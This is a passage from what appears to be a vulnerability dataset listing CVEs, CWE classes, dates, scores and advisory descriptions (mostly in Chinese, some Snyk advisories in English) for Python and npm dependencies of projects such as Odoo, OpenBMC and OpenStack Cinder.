* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `PyPDF2` to version 2.10.6 or higher.
## References
- [GitHub Commit](https://github.com/py-pdf/pypdf/pull/1331/commits/f88a1b022de5822261abec4e7dd9fa0e457a4ee7?show-viewed-files=true&file-filters%5B%5D=)
- [GitHub Issue](https://github.com/py-pdf/pypdf/issues/1329)
- [GitHub PR](https://github.com/py-pdf/pypdf/pull/1331)
",2,2
odoo_odoo,PyPDF2,,True,CVE-2023-36810,CWE-407,2023-06-30,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
pypdf 1.27.9之前版本存在安全漏洞，该漏洞源于攻击者可以制PDF导致意外的长时间运行，会阻塞进程。",3,0
odoo_odoo,reportlab,,True,CVE-2019-17626,CWE-91,2019-10-16,<p>ReportLab是一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。 ReportLab 3.5.26及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行代码。</p>,1,2
odoo_odoo,reportlab,,True,CVE-2020-28463,CWE-918,2021-01-03,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab 中存在安全漏洞。该漏洞源于服务端可通过 img tags引发服务端请求伪造漏洞。以下产品及版本受到影响：Reportlab",2,0
odoo_odoo,reportlab,,True,CVE-2023-33733,CWE-94,2023-05-31,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab v3.6.12及之前版本存在安全漏洞，该漏洞源于允许攻击者通过提供精心制作的PDF文件来执行任意代码。",2,2
odoo_odoo,reportlab,,True,CVE-2019-19450,CWE-91,2023-09-20,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
ReportLab 3.5.31 之前版本存在安全漏洞，该漏洞源于paraparser 允许远程执行代码， paraparser.py 中的 start_unichar 会评估 XML 文档中 unichar 元素中不受信任的用户输入，<unichar code=后可以跟任意 Python 代码。",1,2
odoo_odoo,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
odoo_odoo,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
odoo_odoo,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
odoo_odoo,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
odoo_odoo,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
odoo_odoo,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
odoo_odoo,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
odoo_odoo,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
odoo_odoo,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
odoo_odoo,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
odoo_odoo,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
odoo_odoo,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
odoo_odoo,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
odoo_odoo,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
odoo_odoo,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
odoo_odoo,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
odoo_odoo,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
odoo_odoo,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
odoo_odoo,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
odoo_odoo,werkzeug,,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
odoo_odoo,werkzeug,,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
odoo_odoo,werkzeug,,True,CVE-2022-29361,CWE-444,2022-05-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.1.0版本及之前版本存在环境问题漏洞，该漏洞源于不正确解析 HTTP 的请求。攻击者利用该漏洞通过特制的 HTTP 请求执行 HTTP 请求走私。",1,1
odoo_odoo,werkzeug,,True,,CWE-310,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Randomness. `SHA1` hash algorithm is used with 1000 rounds for hashing. This deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.12 or higher.
## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/753)
",4,0
odoo_odoo,werkzeug,,True,,CWE-331,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Entropy. Secure cookies created as part of  ` werkzeug.contrib.securecookie` were generate through weak hashing which deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.3.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/84eabcaa81f60d47939ac2d43f01d01eeab598a4)
- [GitHub Release Notes](https://github.com/pallets/werkzeug/blob/master/CHANGES.rst#version-031)
",4,0
odoo_odoo,werkzeug,,True,CVE-2016-10516,CWE-79,2017-10-23,"Pallets Flask是Pallets项目中的一个基于Python的Web应用开发工具。Pallets Werkzeug是其中的一个WSGI工具包。
Pallets Flask和其他产品中使用的Pallets Werkzeug 0.11.11之前的版本的debugger的debug/tbtools.py文件的‘render_full’函数存在跨站脚本漏洞。远程攻击者可借助带有异常消息的字段利用该漏洞注入任意的Web脚本或HTML。",3,0
odoo_odoo,werkzeug,,True,,CWE-113,2017-12-04,"## Overview
Affected versions of [`werkzeug`](https://pypi.python.org/pypi/werkzeug) are vulnerable to HTTP Response Splitting.
It allows newline characters in values in the header. An attacker can leverage this to inject arbitrary headers and conduct HTTP response splitting attacks.

## Remediation
Upgrade `werkzeug` to version 0.8 or higher.

## References
- [GitHub Changelog](https://github.com/pallets/werkzeug/blob/master/CHANGES#L722)
- [Github Commit](https://github.com/pallets/werkzeug/commit/694aae3ec2b73292ffe6ab960807bc8cf8474b81)
",3,2
odoo_odoo,werkzeug,,True,,CWE-79,2016-08-31,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks via the `plaintext` variable in the debug page.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/1001)
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/1034edc7f901dd645ec6e462754111b39002bd65)
",3,2
odoo_odoo,werkzeug,,True,,CWE-79,2012-02-05,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks due to the lack of sanitization of the redirect url links.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/7b8d887d33c768a77f40dd15ff5ac6ebbbab25b9)
",3,2
odoo_odoo,werkzeug,,True,CVE-2020-28724,CWE-601,2020-11-18,"Pallets Werkzeug是一款WSGI Web应用程序库。
werkzeug 0.11.6之前版本存在安全漏洞，该漏洞源于在URL中通过双斜杠打开重定向漏洞。",3,0
odoo_odoo,werkzeug,,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
odoo_odoo,werkzeug,,True,CVE-2019-14322,CWE-22,2019-07-28,Pallets Werkzeug 是一款WSGI Web应用程序库，提供了用于开发Web应用的工具和功能。在Pallets Werkzeug 0.15.5之前的版本中，SharedDataMiddleware组件存在安全漏洞。该漏洞的根本原因是SharedDataMiddleware错误处理了在Windows路径名称中的驱动程序名（例如：C:）。攻击者可以利用这一漏洞，通过构造特殊请求来访问服务器上的任意文件，导致信息泄露。,2,1
odoo_odoo,werkzeug,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
odoo_odoo,werkzeug,,True,CVE-2019-14806,CWE-331,2019-08-09,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 0.15.3之前版本中存在安全漏洞，该漏洞源于Docker容器中调试程序PIN码随机不充分。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",2,2
odoo_odoo,werkzeug,,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
odoo_odoo,werkzeug,,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
odoo_odoo,werkzeug,,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
odoo_odoo,micromatch,4.0.5,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
openbmc_openbmc,jinja2,3.1.1,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
openbmc_openbmc,jinja2,3.1.1,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
openbmc_openbmc,jinja2,3.1.1,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
openbmc_openbmc,jinja2,3.1.1,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
openbmc_openbmc,jinja2,3.1.1,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
openstack_cinder,Pygments,>=2.6.1,True,CVE-2021-20270,CWE-835,2021-03-09,"Red Hat Ansible Automation是  （Red Hat）开源的一个应用软件。提供一个自动化基础架构的各个方面，从服务器和网络设备到操作系统，应用程序和安全性。
Red Hat Ansible Automation 存在安全漏洞，该漏洞源于无限循环可能导致DoS。",2,2
openstack_cinder,Pygments,>=2.6.1,True,CVE-2021-27291,CWE-1333,2021-03-17,"Matthäus G. Chajdas pygments是  （Matthäus G. Chajdas）开源的一个应用软件。提供通用语法突出显示工具功能。
pygments 1.1+ 存在安全漏洞，攻击者可利用该漏洞可以导致拒绝服务。",2,2
openstack_cinder,Pygments,>=2.6.1,True,CVE-2022-40896,CWE-434,2023-07-02,"Matthäus G. Chajdas pygments是 Matthäus G. Chajdas开源的一个应用软件。提供通用语法突出显示工具功能。
pygments 2.15.0及之前版本存在安全漏洞，该漏洞源于pygments/lexers/smithy.py存在正则表达式拒绝服务（ReDoS）漏洞。",3,0
openstack_cinder,pyOpenSSL,>=1.0.0,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
openstack_cinder,pyOpenSSL,>=1.0.0,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
openstack_cinder,pywbem,>=0.7.0,True,CVE-2013-6418,CWE-20,2013-12-09,"PyWBEM是一个基于Python的WBEM客户端。
PyWBEM 0.7及之前的版本中存在安全漏洞，该漏洞源于当使用WBEM CIM-XML协议时，程序没有正确处理HTTPS连接。攻击者可通过实施中间人攻击利用该漏洞欺骗连接。",2,0
openstack_cinder,pywbem,>=0.7.0,True,CVE-2013-6444,CWE-20,2013-12-17,"PyWBEM是一个基于Python的WBEM客户端。
PyWBEM 0.7及之前的版本中存在安全漏洞，该漏洞源于程序没有验证服务器主机名是否与X.509证书的域名匹配。攻击者可借助任意有效的证书利用该漏洞实施中间人攻击欺骗SSL服务器。",3,0
openstack_cinder,eventlet,">=0.30.1,!=0.32.0",True,CVE-2021-21419,CWE-400,2021-05-07,"Eventlet是Python的一个并发网络库。
Eventlet 0.31.0 之前版本存在资源管理错误漏洞，该漏洞源于一个websocket peer可能会通过发送非常大的websocket帧来耗尽Eventlet端的内存。",3,2
openstack_cinder,eventlet,">=0.30.1,!=0.32.0",True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
openstack_cinder,lxml,>=4.5.2,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
